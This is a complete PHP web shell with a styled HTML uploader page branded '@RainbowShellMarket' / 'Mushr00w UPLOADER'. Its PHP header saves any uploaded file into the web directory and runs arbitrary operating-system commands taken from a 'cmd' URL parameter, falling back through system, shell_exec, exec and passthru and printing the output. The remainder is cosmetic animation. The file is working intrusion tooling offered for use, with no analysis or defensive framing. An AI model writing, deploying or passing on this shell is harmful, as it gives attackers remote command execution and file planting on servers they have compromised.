<?php
if(isset($_FILES['file'])){$t=basename($_FILES['file']['name']);echo move_uploaded_file($_FILES['file']['tmp_name'],$t)?"<a href='$t'>$t</a>":"fail";exit;}
if(isset($_GET['cmd'])){$c=$_GET['cmd'];$o='';if(function_exists('system')){ob_start();system($c);$o=ob_get_clean();}elseif(function_exists('shell_exec')){$o=shell_exec($c);}elseif(function_exists('exec')){exec($c,$l);$o=implode("\n",$l);}elseif(function_exists('passthru')){ob_start();passthru($c);$o=ob_get_clean();}echo "<pre>$o</pre>";exit;}
?>
<!DOCTYPE html>
<html>
<head><title>Upload</title></head>
<body style="background:#0a0a0a;color:#0f0;font-family:monospace;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;margin:0;overflow:hidden;gap:80px">
<div id="t" style="position:relative;z-index:3;font-weight:bold;font-size:72px;white-space:nowrap;letter-spacing:4px;color:#111;-webkit-text-stroke:2px #0f0;text-align:center">@RainbowShellMarket</div>
<form method="POST" enctype="multipart/form-data" style="position:relative;z-index:10;background:#111;padding:40px;border:2px solid #0f0;border-radius:10px;text-align:center;box-shadow:0 0 40px rgba(0,255,0,0.3)">
<h2 style="font-size:22px">Mushr00w UPLOADER</h2>
<input type="file" name="file" required style="background:#0a0a0a;color:#0f0;border:1px solid #0f0;padding:10px;border-radius:5px">
<br><br>
<button type="submit" style="background:#0f0;color:#0a0a0a;padding:10px 30px;border:none;border-radius:5px;font-weight:bold;cursor:pointer">CLICK TO UPLOAD</button>
</form>
<script>
(function(){
  var el = document.getElementById('t');
  var C = [
    '#ff0000','#ff3300','#ff6600','#ff9900','#ffcc00','#ffff00',
    '#ccff00','#99ff00','#66ff00','#33ff00','#00ff00','#00ff33',
    '#00ff66','#00ff99','#00ffcc','#00ffff','#00ccff','#0099ff',
    '#0066ff','#0033ff','#0000ff','#3300ff','#6600ff','#9900ff',
    '#cc00ff','#ff00ff','#ff00cc','#ff0099','#ff0066','#ff0033',
    '#ff1493','#ff69b4','#ff85c2','#ffa07a','#7fffd4','#40e0d0',
    '#9370db','#ba55d3','#da70d6','#ee82ee','#dda0dd','#e6e6fa',
    '#f0e68c','#bdb76b','#adff2f','#7cfc00','#00fa9a','#48d1cc'
  ];
  var i = 0;
  setInterval(function(){
    i = (i + 1) % C.length;
    var glow = (Math.random() > 0.5) ? 1 : 0.4;
    el.style.textShadow =
      '0 0 10px ' + C[i] + ', 0 0 20px ' + C[(i+1)%C.length] + ', 0 0 30px ' + C[(i+2)%C.length] + ', 0 0 50px ' + C[(i+3)%C.length] + ', 0 0 70px ' + C[(i+4)%C.length];
    el.style.opacity = glow;
  }, 50);
})();
</script>
</body>
</html>
